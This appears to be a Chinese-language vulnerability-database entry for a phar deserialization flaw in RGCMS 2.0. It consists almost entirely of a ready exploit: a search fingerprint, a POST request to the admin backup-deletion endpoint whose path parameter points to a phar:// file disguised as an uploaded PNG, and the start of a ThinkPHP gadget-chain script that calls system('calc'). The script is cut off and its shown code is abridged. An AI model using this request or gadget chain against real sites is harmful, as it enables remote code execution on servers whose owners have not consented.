# RGCMS2.0存在phar反序列化漏洞

- **系统**：RGCMS2　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`"RGCMS"`
- **请求**：`POST /admin.php/data/delbackup HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 212`　`Cookie: PHPSESSID=us9vfbgeh2i9c5kcp7h27ii8ns`　`Priority: u=0`

**请求体 / payload**
```
title=20240820110529_rgcms.db&path=phar://upload/image/20240820/2057e04b4b2d528ed7726d233fc87191.png&children=&mtime=2024-08-20+11%3A05%3A29&size=1.09MB&type=file&ext=db&isReadable=true&isWritable=true&edit=false
生成phar文件
<?php
namespace think\process\pipes {
class Windows
private $files;
public function __construct($files)
$this->files = array($files);
namespace think\model\concern {
trait Conversion
protected $append = array("smi1e" => "1");
trait Attribute
private $data;
private $withAttr = array("smi1e" => "system");
public function get()
$this->data = array("smi1e" => "calc");
namespace t…（脚本共 1241 字，完整版见原文）
```
- **预期**：200　|　—